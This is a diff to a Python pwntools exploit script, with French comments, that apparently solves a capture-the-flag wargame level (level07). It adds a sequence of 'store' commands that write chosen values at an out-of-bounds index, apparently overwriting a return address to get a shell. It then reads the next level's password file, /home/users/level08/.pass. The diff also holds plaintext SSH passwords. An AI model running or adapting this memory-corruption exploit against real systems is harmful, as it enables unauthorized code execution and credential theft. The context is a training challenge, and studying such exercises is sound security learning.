@@ -13,7 +13,7 @@ LOCAL = False  # Mettre à False pour l'exploitation SSH
 HOST = "localhost"  # Hôte pour SSH
 PORT = 8881  # Port pour SSH
 USER = "level07"  # Nom d'utilisateur SSH
-PASSWORD = "h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq"  # Mot de passe SSH
+PASSWORD = "GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8"  # Mot de passe SSH
 SSH_SESSION = None
 
 
@@ -79,10 +79,6 @@ def calc_serial(login):
 def exploit():
 
 
-    login = b"jerdos"
-
-    serial = str(calc_serial(login.decode()))
-    print(f"Serial: {serial}")
 
     conn = get_connection()
 
@@ -93,10 +89,32 @@ def exploit():
           ''')
 
 
+    conn.recvuntil(b'Input command:')
+    conn.sendline(b'store')
+    conn.recvuntil(b'Number:')
+    conn.sendline(b'4159090384')
+    conn.recvuntil(b'Index:')
+    conn.sendline(b'2147483762')
+    conn.recvuntil(b'Completed store command successfully')
+    conn.sendline(b'store')
+    conn.recvuntil(b'Number:')
+    conn.sendline(b'4159040368')
+    conn.recvuntil(b'Index:')
+    conn.sendline(b'115')
+    conn.recvuntil(b'Completed store command successfully')
+    conn.sendline(b'store')
+    conn.recvuntil(b'Number:')
+    conn.sendline(b'4160264172')
+    conn.recvuntil(b'Index:')
+    conn.sendline(b'116')
+    conn.recvuntil(b'Completed store command successfully')
+    conn.sendline(b'quit')
+
+
     try:
         if not LOCAL:
             conn.recvuntil(b'$')
-            conn.sendline('cat /home/users/level08/.pass')
+            conn.sendline(b'cat /home/users/level08/.pass')
             flag = conn.recvline()
             print("\n=== Flag ===")
             print(flag.decode())
